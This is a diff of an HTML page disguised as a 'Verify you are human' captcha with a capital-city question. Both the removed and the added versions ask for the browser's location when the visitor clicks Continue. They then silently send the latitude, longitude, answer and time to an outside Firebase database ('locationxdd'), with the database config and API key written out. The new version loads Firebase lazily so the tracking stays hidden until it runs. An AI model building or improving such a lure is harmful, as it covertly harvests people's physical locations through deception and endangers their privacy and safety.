@@ -2,51 +2,52 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Verification</title>
 
 <style>
+*{box-sizing:border-box}
 body{
   margin:0;
-  font-family: system-ui, Arial;
+  font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
   background:#0f172a;
   display:flex;
   align-items:center;
   justify-content:center;
-  height:100vh;
-  color:white;
+  min-height:100vh;
+  color:#fff;
 }
-
 .card{
   background:#111827;
-  padding:24px;
+  padding:20px;
   border-radius:14px;
-  width:300px;
+  width:100%;
+  max-width:320px;
   text-align:center;
 }
-
 input{
   width:100%;
   padding:10px;
-  border:none;
+  border:0;
   border-radius:8px;
   margin-top:10px;
+  outline:none;
 }
-
 button{
   margin-top:12px;
   width:100%;
   padding:10px;
-  border:none;
+  border:0;
   border-radius:10px;
   background:#3b82f6;
-  color:white;
+  color:#fff;
   cursor:pointer;
+  font-weight:600;
 }
-
 .status{
   margin-top:10px;
   font-size:14px;
+  opacity:.9;
 }
 </style>
 </head>
@@ -56,62 +57,76 @@ button{
   <h2>Verify you are human</h2>
   <p id="question"></p>
   <input id="answer" placeholder="Answer">
-  <button onclick="verify()">Continue</button>
+  <button id="btn">Continue</button>
   <div class="status" id="status"></div>
 </div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
-  authDomain: "locationxdd.firebaseapp.com",
-  databaseURL: "https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "locationxdd",
-  storageBucket: "locationxdd.firebasestorage.app",
-  messagingSenderId: "114480292043",
-  appId: "1:114480292043:web:d143429c68784b0706bb4e"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-
-/* Quiz questions */
-const questions = [
-  "Capital of France?",
-  "Capital of Japan?",
-  "Capital of Italy?",
-  "Capital of Germany?",
-  "Capital of Canada?"
+<script>
+const questions=[
+"Capital of France?",
+"Capital of Japan?",
+"Capital of Italy?",
+"Capital of Germany?",
+"Capital of Canada?"
 ];
 
-document.getElementById("question").textContent =
-  questions[Math.floor(Math.random()*questions.length)];
+const q=document.getElementById("question");
+const a=document.getElementById("answer");
+const s=document.getElementById("status");
+const btn=document.getElementById("btn");
 
-function verify(){
-  const status = document.getElementById("status");
-  status.textContent = "Verifying...";
+q.textContent=questions[Math.floor(Math.random()*questions.length)];
 
-  navigator.geolocation.getCurrentPosition(async position => {
+btn.onclick=verify;
 
-    const data = {
-      answer: document.getElementById("answer").value,
-      time: new Date().toISOString(),
-      lat: position.coords.latitude,
-      lng: position.coords.longitude
-    };
+async function verify(){
+  s.textContent="Verifying...";
+  btn.disabled=true;
 
-    await push(ref(db,"visitors"), data);
+  if(!navigator.geolocation){
+    s.textContent="Geolocation not supported.";
+    return;
+  }
 
-    status.textContent = "Verification complete.";
-  },
-  () => {
-    status.textContent = "Location permission denied.";
-  });
+  navigator.geolocation.getCurrentPosition(async pos=>{
+    try{
+
+      // Lazy load Firebase only now
+      const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
+      const { getDatabase, ref, push } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js");
+
+      const firebaseConfig={
+        apiKey:"AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
+        authDomain:"locationxdd.firebaseapp.com",
+        databaseURL:"https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId:"locationxdd",
+        storageBucket:"locationxdd.firebasestorage.app",
+        messagingSenderId:"114480292043",
+        appId:"1:114480292043:web:d143429c68784b0706bb4e"
+      };
+
+      const app=initializeApp(firebaseConfig);
+      const db=getDatabase(app);
+
+      await push(ref(db,"visitors"),{
+        answer:a.value,
+        time:Date.now(),
+        lat:pos.coords.latitude,
+        lng:pos.coords.longitude
+      });
+
+      s.textContent="Verification complete.";
+
+    }catch(e){
+      s.textContent="Error. Try again.";
+      btn.disabled=false;
+    }
+
+  },()=>{
+    s.textContent="Location permission denied.";
+    btn.disabled=false;
+  },{enableHighAccuracy:false,timeout:8000,maximumAge:60000});
 }
-
-window.verify = verify;
 </script>
 
 </body>
